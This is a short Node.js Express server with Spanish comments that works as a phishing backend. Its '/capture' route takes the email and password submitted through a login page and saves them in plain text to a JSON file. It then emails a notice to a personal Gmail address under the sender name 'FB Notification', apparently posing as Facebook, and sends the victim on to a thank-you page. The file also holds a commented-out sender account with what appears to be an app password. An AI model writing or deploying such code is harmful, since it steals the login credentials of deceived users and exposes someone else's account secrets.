const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));


const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false, // true para SSL, false para TLS
    auth: {
        //user: 'noreply@htk-id.com', 
        //pass: 'rypx resj ocsr yatq', 
    }
});
  
// Servir archivos estáticos (HTML, CSS)
app.use(express.static(path.join(__dirname, 'public')));

// Ruta para manejar el formulario de inicio de sesión
app.post('/capture', (req, res) => {
    const { email, password } = req.body;
    const data = {
        email,
        password,
        timestamp: new Date().toISOString()
    };

    // Guardar datos en un archivo JSON
    fs.appendFile('responses.json', JSON.stringify(data, null, 2) + ',\n', (err) => {
        if (err) {
            console.error('Error guardando los datos:', err);
            res.status(500).send('Error interno del servidor');
            return;
        }

        // Configurar el correo electrónico
        const mailOptions = {
            from: 'FB Notification <noreply@htk-id.com>',
            to: 'cchacon266@gmail.com', // Dirección de correo electrónico del destinatario
            subject: 'Se ha iniciado sesión',
            text: `Se ha iniciado sesión con el correo electrónico: ${email}`
        };

        // Enviar el correo electrónico
        transporter.sendMail(mailOptions, function(error, info) {
            if (error) {
                console.log(error); 
            } else {
                console.log('Correo electrónico enviado: ' + info.response);
            }
        });

        res.redirect('/thank_you.html');
    });
});

app.listen(port, () => {
    console.log(`Servidor ejecutándose en http://localhost:${port}`);
});
  